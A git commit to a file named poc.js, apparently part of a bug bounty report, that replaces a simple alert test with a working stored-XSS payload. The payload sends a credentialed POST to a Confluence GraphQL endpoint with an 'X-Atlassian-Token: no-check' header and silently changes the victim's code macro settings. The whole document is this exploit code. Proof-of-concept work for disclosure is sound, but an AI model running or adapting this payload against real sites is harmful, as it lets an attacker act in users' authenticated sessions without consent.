5ded99918d014a53b46df04988a31e8243b21aa0
analystcrowd <72997177+analystcrowd@users.noreply.github.com>
2026-03-11 13:14:04 +0000

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,49 @@
-alert('stored xss from github');
+function updateCodeMacroConfig() {
+  var xhttp = new XMLHttpRequest();
+
+  var url = "https://bugcrowdanalyst-team-fqpw2x2m.atlassian.net/cgraphql?q=ConfigureCodeMacroPageUpdateMutation";
+
+  xhttp.open("POST", url, true);
+
+
+  xhttp.setRequestHeader("Content-type", "application/json");
+  xhttp.setRequestHeader("Accept", "*/*");
+  xhttp.setRequestHeader("X-Apollo-Operation-Name", "ConfigureCodeMacroPageUpdateMutation");
+  xhttp.setRequestHeader("Atl-Agg-Confluence-Mutationerror-Compat", "false");
+
+
+  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
+
+
+  xhttp.withCredentials = true;
+
+
+  var data = JSON.stringify([{
+    "operationName": "ConfigureCodeMacroPageUpdateMutation",
+    "variables": {
+      "input": {
+        "themeName": "Confluence", 
+        "languageName": "Cpp" 
+      }
+    },
+    "query": "mutation ConfigureCodeMacroPageUpdateMutation($input: ConfluenceUpdateNewCodeMacroInput!) {\n  confluence {\n    updateNewCodeMacro(input: $input) {\n      errors {\n        message\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
+  }]);
+
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4) {
+      console.log("Code Macro Update Status: " + this.status);
+      console.log("Response JSON: " + this.responseText);
+
+      if (this.responseText.includes('"success":true')) {
+        console.log("✅ Code Macro settings updated via XSS!");
+      } else {
+        console.log("❌ Update failed. Check response for details.");
+      }
+    }
+  };
+
+  xhttp.send(data);
+}
+
+updateCodeMacroConfig();
+
